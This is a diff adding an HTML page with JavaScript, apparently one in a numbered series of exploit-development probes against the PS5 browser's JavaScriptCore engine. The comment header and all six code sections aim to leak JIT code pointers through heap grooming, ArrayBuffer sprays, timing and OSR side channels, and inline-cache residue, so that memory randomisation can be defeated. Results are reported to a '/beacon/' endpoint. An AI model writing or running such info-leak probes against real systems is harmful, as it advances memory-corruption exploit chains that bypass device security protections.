@@ -1,0 +1,290 @@
+<!--
+  p765: JIT CodeBlock pointer leak via heap grooming
+
+  DFG JIT is confirmed active on PS5 14.10 (p602: 5M loop in 49ms).
+  JIT compilation creates CodeBlock objects in the JSC heap that
+  contain native code pointers (JIT code address, entry points).
+  These CodeBlock objects live alongside other JSC objects.
+
+  Key insight: when a JIT-compiled function is collected by GC,
+  its CodeBlock is freed. If we can observe what occupies that
+  memory afterward (via ArrayBuffer or typed array spray), we might
+  read residual JIT code pointers -- which reveal the executable
+  memory region's base address.
+
+  Additionally: JSC's DFG compiler allocates executable memory from
+  a dedicated region. The base of this region is related to (but
+  distinct from) the WebProcess text base. However, knowing the JIT
+  region's base constrains the ASLR search space significantly.
+
+  The new Function() constructor IS JIT-compiled (p602 confirmed).
+  Creating many functions, warming them to DFG tier, then dropping
+  them creates CodeBlock garbage with code pointers.
+
+  Attack angles:
+  A) Create/warm/drop JIT functions, spray matching size ABs.
+  B) Measure Function object size via GC pressure differential.
+  C) Check if function.name or toString leaks compilation state.
+  D) JIT region detection via allocation timing differential.
+  E) DFG OSR exit counter as side channel.
+  F) Inline cache (IC) stub pointer residue after function drop.
+
+  CRASH_CLASS: LOW (function creation/GC/allocation, no side effects)
+  prior art: p602 (DFG confirmed), p630 (no debug APIs)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p765</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
+}
+function isExecPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  var lo=dv.getUint32(off,true);
+  return hi!==0 && (hi>>>0)>=0x100 && (hi>>>0)<0x80000000 && (lo&0xFFF)!==0;
+}
+
+window.onload=function(){
+b('p765-START');
+
+// === Section A: Create/warm/drop JIT funcs, spray ABs ===
+try{
+  b('A-jit-spray');
+  var aHits=0;
+  var SIZES=[64,128,192,256,384,512];
+
+  for(var si=0;si<SIZES.length;si++){
+    var SZ=SIZES[si];
+    var funcs=[];
+    for(var i=0;i<200;i++){
+      var f=new Function('x','var s=0;for(var j=0;j<100;j++)s+=x+j;return s;');
+      funcs.push(f);
+    }
+    for(var i=0;i<funcs.length;i++){
+      for(var w=0;w<500;w++)funcs[i](w);
+    }
+    funcs=null;
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+
+    var abs=[];
+    for(var i=0;i<500;i++){
+      abs.push(new ArrayBuffer(SZ));
+    }
+    var szHits=0;
+    for(var i=0;i<abs.length;i++){
+      var dv=new DataView(abs[i]);
+      for(var off=0;off+8<=SZ;off+=8){
+        if(isExecPtr(dv,off)){
+          szHits++;
+          if(szHits<=3){
+            b('A-EXECPTR sz='+SZ+' i='+i+' off='+off+' val='+hex64(dv,off));
+          }
+        }else if(isPtr(dv,off)){
+          szHits++;
+          if(szHits<=3){
+            b('A-PTR sz='+SZ+' i='+i+' off='+off+' val='+hex64(dv,off));
+          }
+        }
+      }
+    }
+    aHits+=szHits;
+    b('A sz='+SZ+' hits='+szHits);
+    abs=null;
+  }
+  b('A-DONE total='+aHits);
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: Function object size via GC pressure ===
+try{
+  b('B-func-size');
+  function measureGCPressure(allocFn,count){
+    var t0=Date.now();
+    var arr=[];
+    for(var i=0;i<count;i++){
+      arr.push(allocFn(i));
+    }
+    var t1=Date.now();
+    arr=null;
+    for(var i=0;i<2000;i++){var tmp=new ArrayBuffer(256);}
+    var t2=Date.now();
+    return {alloc:t1-t0,gc:t2-t1};
+  }
+
+  var funcResult=measureGCPressure(function(i){
+    return new Function('x','return x+'+i+';');
+  },2000);
+  b('B func alloc='+funcResult.alloc+'ms gc='+funcResult.gc+'ms');
+
+  var abResult=measureGCPressure(function(i){
+    return new ArrayBuffer(128);
+  },2000);
+  b('B ab128 alloc='+abResult.alloc+'ms gc='+abResult.gc+'ms');
+
+  var ab2Result=measureGCPressure(function(i){
+    return new ArrayBuffer(256);
+  },2000);
+  b('B ab256 alloc='+ab2Result.alloc+'ms gc='+ab2Result.gc+'ms');
+
+  var ab3Result=measureGCPressure(function(i){
+    return new ArrayBuffer(64);
+  },2000);
+  b('B ab64 alloc='+ab3Result.alloc+'ms gc='+ab3Result.gc+'ms');
+
+  b('B-DONE ratio_func_vs_ab128='+(funcResult.gc/Math.max(1,abResult.gc)).toFixed(2));
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: Function toString / name compilation artifacts ===
+try{
+  b('C-tostring');
+  var f1=new Function('x','return x*2;');
+  for(var i=0;i<50000;i++)f1(i);
+  var str1=f1.toString();
+  b('C jit_tostring_len='+str1.length);
+  b('C jit_tostring='+str1.substring(0,100));
+
+  var f2=function namedFunc(x){return x*3;};
+  for(var i=0;i<50000;i++)f2(i);
+  b('C named_tostring='+f2.toString().substring(0,100));
+  b('C named_name='+f2.name);
+
+  var f3=new Function('a','b','c','return a+b+c;');
+  b('C multi_arg_tostring='+f3.toString().substring(0,100));
+
+  try{
+    var props=Object.getOwnPropertyNames(f1);
+    b('C func_props=['+props.join(',')+']');
+    for(var i=0;i<props.length;i++){
+      var desc=Object.getOwnPropertyDescriptor(f1,props[i]);
+      var val;
+      try{val=f1[props[i]];}catch(e){val='<err>';}
+      b('C prop_'+props[i]+'='+String(val).substring(0,60)+' enum='+desc.enumerable);
+    }
+  }catch(e){b('C-props-err '+e.message);}
+
+  b('C-DONE');
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: JIT region timing differential ===
+try{
+  b('D-jit-timing');
+  function timeCall(fn,iters){
+    var t0=Date.now();
+    for(var i=0;i<iters;i++)fn(i);
+    return Date.now()-t0;
+  }
+
+  var interpreted=new Function('x','return x;');
+  var tInterp=timeCall(interpreted,100);
+  b('D cold_100='+tInterp+'ms');
+
+  for(var i=0;i<100000;i++)interpreted(i);
+  var tWarm=timeCall(interpreted,100000);
+  b('D warm_100k='+tWarm+'ms');
+
+  var funcs=[];
+  for(var i=0;i<50;i++){
+    var f=new Function('x','var s=0;for(var j=0;j<10;j++)s+=x+j+'+i+';return s;');
+    funcs.push(f);
+  }
+  for(var fi=0;fi<funcs.length;fi++){
+    for(var w=0;w<10000;w++)funcs[fi](w);
+  }
+  var times=[];
+  for(var fi=0;fi<funcs.length;fi++){
+    times.push(timeCall(funcs[fi],100000));
+  }
+  var mn=times[0],mx=times[0],sum=0;
+  for(var i=0;i<times.length;i++){
+    if(times[i]<mn)mn=times[i];
+    if(times[i]>mx)mx=times[i];
+    sum+=times[i];
+  }
+  b('D 50funcs min='+mn+' max='+mx+' avg='+(sum/times.length).toFixed(1)+'ms');
+  b('D-DONE');
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: DFG OSR exit counter side channel ===
+try{
+  b('E-osr-exit');
+  function triggerOSR(fn,warmup,triggerVal){
+    for(var i=0;i<warmup;i++)fn(i);
+    var t0=Date.now();
+    var r=fn(triggerVal);
+    var t1=Date.now();
+    return {result:r,time:t1-t0};
+  }
+
+  var polyFn=new Function('x','if(typeof x==="number")return x+1;return x.length;');
+  var r1=triggerOSR(polyFn,50000,'hello');
+  b('E osr_string result='+r1.result+' time='+r1.time+'ms');
+
+  var r2=triggerOSR(polyFn,50000,{length:42});
+  b('E osr_obj result='+r2.result+' time='+r2.time+'ms');
+
+  var typeFn=new Function('x','var a=x|0;return a+a;');
+  for(var i=0;i<100000;i++)typeFn(i);
+  var t0=Date.now();
+  for(var i=0;i<1000;i++)typeFn(1.5);
+  var tDouble=Date.now()-t0;
+  b('E double_osr_1k='+tDouble+'ms');
+
+  t0=Date.now();
+  for(var i=0;i<1000;i++)typeFn(i);
+  var tInt=Date.now()-t0;
+  b('E int_after_osr_1k='+tInt+'ms');
+  b('E-DONE');
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: IC stub pointer residue ===
+try{
+  b('F-ic-residue');
+  var fHits=0;
+
+  var protos=[];
+  for(var i=0;i<20;i++){
+    var p={};
+    p['prop'+i]=i;
+    p['val'+i]=new ArrayBuffer(64);
+    protos.push(p);
+  }
+
+  var accessFn=new Function('obj','return obj.prop0;');
+  for(var i=0;i<50000;i++)accessFn(protos[0]);
+
+  for(var i=1;i<protos.length;i++){
+    accessFn(protos[i]);
+  }
+
+  protos=null;
+  accessFn=null;
+
+  for(var i=0;i<5000;i++){var tmp=new ArrayBuffer(128);}
+
+  var abs=[];
+  for(var i=0;i<1000;i++){
+    abs.push(new ArrayBuffer(128));
+  }
+  for(var i=0;i<abs.length;i++){
+    var dv=new DataView(abs[i]);
+    for(var off=0;off+8<=128;off+=8){
+      if(isExecPtr(dv,off)){
+        fHits++;
+        if(fHits<=5)b('F-EXECPTR i='+i+' off='+off+' val='+hex64(dv,off));
+      }
+    }
+  }
+  b('F-DONE hits='+fHits);
+}catch(e){b('F-ERR '+e.message);}
+
+setTimeout(function(){b('p765-COMPLETE');},500);
+};
+</script>
+</head>
+<body></body></html>
